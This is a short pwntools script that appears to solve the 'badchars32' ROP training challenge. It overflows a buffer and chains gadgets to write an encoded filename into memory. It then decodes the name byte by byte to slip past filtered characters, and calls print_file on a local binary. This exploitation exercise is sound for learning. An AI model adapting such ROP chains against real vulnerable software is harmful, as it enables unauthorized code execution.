from pwn import *
##badchars32
offset = 44
printfile = 0x080483d0
data= 0x0804a018
pop_esi_ = 0x080485b9 #pop esi; pop edi; pop ebp; ret;
mov = 0x0804854f  #mov dword ptr [edi], esi; ret;
sub= 0x0804854b  #sub byte ptr [ebp], bl; ret;
pop_ebx = 0x0804839d
pop_ebp=0x080485bb

encoded= "hnci0vzv"
payload = b'A'*offset
payload += p32(pop_esi_)
payload += b"hnci"
payload += p32(data)
payload += p32(0x0)
payload += p32(mov)
payload += p32(pop_esi_)
payload += b"0vzv"
payload += p32(data + 4)
payload += p32 (0x0)
payload += p32(mov)
for byte in range (len(encoded)):
    payload += p32(pop_ebx)
    payload += p32(0x2)
    payload += p32(pop_ebp)
    payload += p32(data+byte)
    payload += p32(sub)
payload+=p32(printfile)
payload+=p32(0x0)
payload += p32(data)
p = process("./badchars32")
p.send(payload)
p.interactive()
